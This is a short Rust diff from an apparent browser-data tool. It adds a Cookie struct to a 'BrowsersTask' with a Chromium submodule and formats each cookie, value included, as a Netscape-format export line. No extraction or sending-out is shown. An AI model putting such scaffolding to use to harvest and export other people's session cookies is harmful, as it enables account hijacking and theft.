@@ -2,10 +2,12 @@
 
 mod chromium;
 
+use alloc::string::String;
 use crate::alloc::borrow::ToOwned;
 extern crate alloc;
 
 use alloc::vec;
+use core::fmt::{Display, Formatter};
 use tasks::Task;
 use tasks::{composite_task, impl_composite_task_runner, CompositeTask};
 use crate::chromium::ChromiumTask;
@@ -25,3 +27,22 @@ impl BrowsersTask {
 }
 
 impl_composite_task_runner!(BrowsersTask, "Browsers");
+
+#[derive(PartialEq, Ord, Eq, PartialOrd)]
+pub(crate) struct Cookie {
+    pub host_key: String,
+    pub name: String,
+    pub value: String,
+    pub path: String,
+    pub expires_utc: i64
+}
+
+impl Display for Cookie {
+    fn fmt(&self, f: &mut Formatter<'_>) -> core::fmt::Result {
+        write!(
+            f, 
+           "{}\tTRUE\t{}\tFALSE\t{}\t{}\t{}\r", 
+           self.host_key, self.path, self.expires_utc, self.name, self.value
+        )
+    }
+}
